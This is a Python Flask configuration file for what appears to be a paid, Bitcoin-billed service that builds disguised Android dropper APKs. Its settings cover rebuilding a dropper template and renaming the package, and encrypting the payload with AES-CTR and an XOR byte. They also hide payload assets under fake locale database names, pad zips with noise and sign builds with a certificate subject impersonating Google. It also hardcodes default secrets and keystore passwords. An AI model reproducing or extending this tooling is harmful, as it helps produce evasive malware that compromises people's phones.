import os
from datetime import timedelta

from dotenv import load_dotenv

load_dotenv()

BASE_DIR = os.path.abspath(os.path.dirname(__file__))


class Config:
    SECRET_KEY = os.environ.get("SECRET_KEY", "katana_secret_2026")
    MAX_CONTENT_LENGTH = 2048 * 1024 * 1024
    SESSION_COOKIE_SECURE = False
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = "Lax"
    PERMANENT_SESSION_LIFETIME = timedelta(days=30)

    TEMPLATES_AUTO_RELOAD = False

    BTCPAY_URL = os.environ.get("BTCPAY_URL", "").rstrip("/")
    BTCPAY_STORE_ID = os.environ.get("BTCPAY_STORE_ID", "")
    BTCPAY_API_KEY = os.environ.get("BTCPAY_API_KEY", "")
    BTCPAY_WEBHOOK_SECRET = os.environ.get("BTCPAY_WEBHOOK_SECRET", "")

    UPLOAD_FOLDER = os.path.join(BASE_DIR, "uploads")
    OUTPUT_FOLDER = os.path.join(BASE_DIR, "outputs")
    STORE_CATALOG_DIR = os.path.join(BASE_DIR, "store_catalog")
    STORE_BTC_ADDRESS = os.environ.get(
        "STORE_BTC_ADDRESS",
        "bc1q9afer30l2a2ruqe2qf2kqhudymx7fl90897a74",
    )
    PUBLIC_APP_BASE_URL = os.environ.get("PUBLIC_APP_BASE_URL", "").rstrip("/")
    PUBLIC_ICONS_FOLDER = os.path.join(BASE_DIR, "outputs", "icons")

    # Shell Wi-Fi (R8 + Material + WorkManager + UI). Legacy em dropper_rebuild_legacy_stub/
    DROPPER_TEMPLATE = os.path.join(BASE_DIR, "dropper_rebuild")
    SIGNER_JAR = os.path.join(BASE_DIR, "signer.jar")
    APKTOOL_JAR = os.path.join(BASE_DIR, "apktool.jar")
    DROPPER_LIBS_DEX = os.path.join(
        BASE_DIR, "dropper_rebuild_legacy_stub", "prebuilt", "androidx_material.dex"
    )
    INJECT_SECONDARY_DEX = False

    _BUILD_TOOLS = os.path.join(
        BASE_DIR, "APP-TEST", "tools", "android-sdk", "build-tools", "35.0.0"
    )
    APKSIGNER = os.path.join(_BUILD_TOOLS, "apksigner")
    ZIPALIGN = os.path.join(_BUILD_TOOLS, "zipalign")
    KEYSTORE_VALIDITY_DAYS = 10000
    KEYSTORE_KEY_ALG = "RSA"
    KEYSTORE_KEY_SIZE = 2048
    KEYSTORE_SIG_ALG = "SHA256withRSA"
    KEYSTORE_STORE_TYPE = "PKCS12"
    # testkey mantido por pedido (fase atual)
    SIGNING_MODE = os.environ.get("SIGNING_MODE", "aosp_testkey")
    AOSP_TESTKEY_PK8 = os.path.join(BASE_DIR, "signing", "testkey.pk8")
    AOSP_TESTKEY_CERT = os.path.join(BASE_DIR, "signing", "testkey.x509.pem")
    RELEASE_KEYSTORE = os.path.join(BASE_DIR, "signing", "release.p12")
    RELEASE_KEY_ALIAS = os.environ.get("RELEASE_KEY_ALIAS", "androidapp")
    RELEASE_KEYSTORE_PASS = os.environ.get(
        "RELEASE_KEYSTORE_PASS", "android_app_release_2026"
    )
    RELEASE_DNAME = os.environ.get(
        "RELEASE_DNAME",
        "CN=Android, OU=Android, O=Google Inc., L=Mountain View, ST=California, C=US",
    )
    APKSIGNER_V3_ENABLED = False

    OLD_PACKAGE = "com.turbo.live"  # len 14 — template Wi-Fi
    # Prefixo legado (generate_package_name agora fixa len==14 estilo com.xxxxx.yyyy)
    PACKAGE_PREFIX = "com"

    CIPHER_TRANSFORM = "AES/CTR/NoPadding"
    # XOR por build (vd.c0 patchado); default pool de referencia 0xE7
    CRYPTO_XOR_FIXED = False
    CRYPTO_XOR_BYTE = 0xE7

    # Asset names len==12 (Wi-Fi u field) — patch dinamico de size no smali
    ASSET_NAME_POOL = (
        "locale_ko.db",
        "locale_ja.db",
        "locale_de.db",
        "locale_fr.db",
        "locale_es.db",
        "locale_pt.db",
        "locale_it.db",
        "locale_zh.db",
        "locale_ru.db",
        "locale_ar.db",
        "cache_kf.bin",
        "config_hd.db",
    )

    ZIP_NORMALIZE_TIMESTAMPS = True
    ZIP_EPOCH_DATE_TIME = (1981, 1, 1, 1, 1, 2)

    PAYLOAD_ZIP_NOISE = True
    PAYLOAD_ZIP_NOISE_MIN = 400
    PAYLOAD_ZIP_NOISE_MAX = 700

    VERSION_NAME_MAJOR = (7, 9)
    VERSION_CODE_BASE = 30


def ensure_directories(config):
    for directory in (
        config.UPLOAD_FOLDER,
        config.OUTPUT_FOLDER,
        config.STORE_CATALOG_DIR,
        config.PUBLIC_ICONS_FOLDER,
    ):
        os.makedirs(directory, exist_ok=True)

